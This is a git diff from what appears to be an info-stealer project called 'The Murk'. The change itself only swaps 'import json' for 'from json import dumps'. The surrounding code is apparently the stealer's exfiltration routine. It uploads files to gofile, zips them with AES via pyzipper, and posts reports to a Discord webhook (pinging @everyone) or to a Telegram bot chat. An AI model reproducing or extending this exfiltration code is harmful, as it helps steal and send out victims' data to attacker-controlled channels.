@@ -16,7 +16,7 @@ from os import getenv,sep,chdir,remove,rmdir
 from manager.logger import Log
 from random import randint
 from pyzipper import AESZipFile,ZIP_STORED,WZ_AES
-import json
+from json import dumps
 
 def upload_file_to_gofile(file_path):
 	try:
@@ -104,7 +104,7 @@ def Send(sendData, msgInfo):
 		message = MsgForDiscord(message, url)
 		message+="\n\n\n**The Murk|by Nick Vinesmoke**"
 		message+="\n@everyone"
-		post(sendData[1], data=json.dumps({"content": message}), headers={'Content-Type': 'application/json'})
+		post(sendData[1], data=dumps({"content": message}), headers={'Content-Type': 'application/json'})
 	if sendData[0] == 1:
 		message+="\n\n\n<b>The Murk|by Nick Vinesmoke</b>"
 		post(f'https://api.telegram.org/bot{sendData[1]}/sendMessage', data={"chat_id": int(sendData[2]), "text": message, "parse_mode": "HTML", "disable_web_page_preview": True})
